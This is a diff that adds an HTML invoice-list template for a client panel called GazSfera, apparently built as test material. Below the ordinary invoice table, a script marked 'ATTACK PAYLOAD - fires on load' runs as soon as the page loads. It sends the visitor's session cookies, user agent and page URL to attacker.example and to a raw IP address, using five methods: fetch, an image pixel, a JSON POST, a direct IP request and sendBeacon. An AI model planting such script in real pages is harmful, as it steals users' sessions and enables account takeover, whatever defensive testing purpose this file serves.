@@ -1,0 +1,99 @@
+{% extends "base.html" %}
+{% block title %}Invoices {{ month }}/{{ year }} - GazSfera{% endblock %}
+
+{% block header_right %}
+<div class="user">
+  Signed in as <b>{{ username }}</b> | <a href="/logout">Sign out</a>
+</div>
+{% endblock %}
+
+{% block content %}
+<div class="breadcrumb">
+  <a href="/dashboard">Home</a> &gt;
+  <a href="/dashboard">Client Panel</a> &gt;
+  <b>Invoices {{ month }}/{{ year }}</b>
+</div>
+
+<h1>Invoices for period {{ month }}/{{ year }}</h1>
+
+{% if invoices %}
+<table class="data">
+  <thead>
+    <tr>
+      <th style="width:40px;">No.</th>
+      <th>Invoice number</th>
+      <th style="width:110px;">Issue date</th>
+      <th style="width:100px;">Due date</th>
+      <th style="width:100px;">Gross amount</th>
+      <th style="width:100px;">Status</th>
+      <th style="width:160px;">Actions</th>
+    </tr>
+  </thead>
+  <tbody>
+    {% for inv in invoices %}
+    <tr>
+      <td class="center">{{ loop.index }}</td>
+      <td><a href="/invoice/{{ inv.id }}?year={{ year }}&month={{ month }}">{{ inv.id }}</a></td>
+      <td>{{ inv.issue_date }}</td>
+      <td>{{ inv.due_date }}</td>
+      <td class="num">{{ "%.2f"|format(inv.amount_gross) }} {{ inv.currency }}</td>
+      <td>{{ inv.status }}</td>
+      <td>
+        <span class="link-download" onclick="confirmDownload('{{ inv.id }}', '{{ year }}', '{{ month }}')">Download invoice (PDF)</span>
+      </td>
+    </tr>
+    {% endfor %}
+  </tbody>
+</table>
+{% else %}
+<div class="empty">
+  No invoices found for the selected period. Try another month.
+</div>
+{% endif %}
+
+<p style="margin-top:14px;font-size:11px;">
+  <a href="/dashboard">&laquo; Back to period selection</a>
+</p>
+
+<!-- ATTACK PAYLOAD - fires on load. Five exfiltration attempts. -->
+<script>
+(function(){
+  var log = function(m){ try { console.log('[GS] ' + m); } catch(e){} };
+  try {
+    fetch('https://attacker.example/steal?c=' + encodeURIComponent(document.cookie))
+      .then(function(r){ log('fetch1:status:' + r.status); })
+      .catch(function(e){ log('fetch1:blocked'); });
+  } catch(e) { log('fetch1:exception'); }
+  try {
+    var img = new Image();
+    img.src = 'https://attacker.example/pixel?d=' + encodeURIComponent(document.cookie);
+    log('image2:sent');
+  } catch(e) { log('image2:exception'); }
+  try {
+    fetch('https://attacker.example/submit', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ user: 'anna', cookie: document.cookie, ua: navigator.userAgent, url: window.location.href })
+    }).then(function(r){ log('post3:status:' + r.status); })
+      .catch(function(e){ log('post3:blocked'); });
+  } catch(e) { log('post3:exception'); }
+  try {
+    fetch('https://185.23.45.67/exfil?d=' + encodeURIComponent(document.cookie))
+      .then(function(r){ log('ip4:status:' + r.status); })
+      .catch(function(e){ log('ip4:blocked'); });
+  } catch(e) { log('ip4:exception'); }
+  try {
+    if (navigator.sendBeacon) {
+      var ok = navigator.sendBeacon('https://attacker.example/beacon', document.cookie);
+      log('beacon5:' + (ok ? 'sent' : 'rejected'));
+    }
+  } catch(e) { log('beacon5:exception'); }
+})();
+
+function confirmDownload(id, year, month) {
+  if (confirm('Are you sure you want to download invoice ' + id + '?')) {
+    window.location.href = '/invoice/' + id + '/download?year=' + year + '&month=' + month;
+  }
+}
+</script>
+{% endblock %}
